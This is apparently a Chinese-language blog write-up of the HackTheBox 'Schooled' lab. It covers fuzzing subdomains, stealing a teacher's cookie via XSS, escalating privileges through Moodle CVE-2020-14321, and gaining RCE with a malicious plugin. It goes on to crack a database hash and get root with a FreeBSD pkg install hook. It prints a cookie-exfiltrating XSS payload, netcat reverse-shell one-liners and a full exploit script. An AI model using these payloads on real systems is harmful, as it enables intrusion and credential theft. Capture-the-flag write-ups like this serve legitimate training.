---
layout:     post
title:      HackTheBox Schooled
subtitle:   HackTheBox
date:       2021-04-30
author:     heria
header-img: img/post-bg-015.jpeg
catalog: true
tags:
---



![image-20210429145751490](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429145751490.png)



## 信息收集

nmap

![image-20210429150024990](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429150024990.png)

访问80页面，各处的链接都点一点，在contact下发现如下的用户和域名信息

![image-20210429150136734](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429150136734.png)

## 渗透

修改/etc/hosts文件

添加

```
10.10.10.234  sechooled.htb
```

子域名扫描

kali下自带很多子域名字典

![image-20210429151047310](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429151047310.png)

使用ffuf进行子域名扫描

kali默认不自带，需要去github下载

https://github.com/ffuf/ffuf/releases

```
./ffuf -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt:FUZZ -u http://schooled.htb/ -H 'Host:FUZZ.schooled.htb' -c -fs 20750
```

![image-20210429154534613](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429154534613.png)

发现moodle.schooled.htb，也添加到hosts，之后访问

![image-20210429154854989](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429154854989.png)

注册用户

![image-20210429155329352](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429155329352.png)

之后continue验证就可以了

![image-20210429155349222](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429155349222.png)



加入课程后在announcements里面发现如下信息，老师会check moodlenet profiles

![image-20210429160500504](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429160500504.png)

可以在该处插入xss打cookie

```
<img src=x onerror=this.src='http://ip:7777/?'+document.cookie;>
```

![image-20210429160941864](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429160941864.png)

之后开端口监听

```
python -m SimpleHTTPServer 7777
```

![image-20210429161314267](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429161314267.png)

之后更改cookie值，用户变为老师

![image-20210429161435964](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429161435964.png)

在点击下图该处时，跳转到https://docs.moodle.org/39/en/Course_homepage页面。

由此知版本为3.9

![image-20210429161639800](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429161639800.png)



搜索到对应的漏洞 CVE-2020-14321

(Moodle是一套免费、开源的电子学习软件平台，也称课程管理系统、学习管理系统或虚拟学习环境。 Moodle中存在权限许可和访问控制问题漏洞，该漏洞源于程序在课程注册中没有进行正确的安全限制。远程攻击者可利用该漏洞提升权限。)

首先当前账户提升至管理权限

在10.10.10.234:80页面曾找到过manager信息

![image-20210429162059712](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429162059712.png)

这个视频链接介绍了如何将账号提至管理员

https://www.youtube.com/watch?v=BkEInFI4oIU

如下操作

![image-20210429162620739](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429162620739.png)

![image-20210429162816666](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429162816666.png)

开启burp抓包

![image-20210429162907898](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429162907898.png)

更改参数，id改为老师id24 ,后面role=1表示manager

![image-20210429164231550](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429164231550.png)

![image-20210429164318085](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429164318085.png)

可以看到已经是管理员，但是未发现管理员控制台选项

![image-20210429164536678](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429164536678.png)

再次添加管理员，之后点进去看到有个log in as

![image-20210429164709267](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429164709267.png)

![image-20210429164745517](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429164745517.png)

成功切换

![image-20210429164850776](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429164850776.png)

这个时候也出现了site administration

![image-20210429164922783](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429164922783.png)



![image-20210429165052184](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429165052184.png)



![image-20210429165159688](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429165159688.png)

抓包

![image-20210429165741224](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429165741224.png)



![image-20210429165810970](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429165810970.png)

使用下面链接中poc替换对应位置内容

https://github.com/HoangKien1020/CVE-2020-14321

之后发送

恶意插件可以从这里下载：

https://github.com/HoangKien1020/Moodle_RCE

上传

![image-20210429170338792](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429170338792.png)

成功

![image-20210429170357699](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429170357699.png)

访问路径moodle/blocks/rce/lang/en/block_rce.php?cmd=command

RCE成功

![image-20210429171126165](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429171126165.png)

反弹即可

```
cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.135 4444 >/tmp/f
```

![image-20210429171650067](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429171650067.png)

执行如下两句

```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

之后在下面的路径中找到数据库信息

![image-20210429172917074](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429172917074.png)

之后登陆数据库，找到库和表，查找用户名密码字段

![image-20210429173449813](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429173449813.png)

![image-20210429173710260](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429173710260.png)



破解admin的hash，得到密码!QAZ2wsx

![image-20210429174600402](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429174600402.png)

根据前面的信息，Jamie是Information Technology Lecturer,在登陆用户中也找到jamie

![image-20210429174412945](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429174412945.png)

使用上面的密码ssh登陆

![image-20210429174714109](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429174714109.png)

发现sudo权限

![image-20210429174741328](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429174741328.png)

获取user flag

![image-20210429175031706](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429175031706.png)



## 提权

http://lastsummer.de/creating-custom-packages-on-freebsd/

运行它生成package，之后sudo安装这个包即可，注意这里使用-U(–no-repo-update)参数取消从仓库中升级

自定义pkg，安装的时候会执行里面的命令，得到root shell

![image-20210429181005063](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429181005063.png)



sudo pkg install --no-repo-update mypackage-1.0_5.txz

成功返回root权限，拿到flag

![image-20210429181825914](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429181825914.png)

![image-20210429181917465](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210429181917465.png)



exp.sh

```
#!/bin/sh

STAGEDIR=/tmp/package
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}
cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF
echo "Resetting root shell"
rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.135 4444 >/tmp/a
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
echo "Registering root shell"
pw usermod -n root -s /bin/sh
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF
pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
```

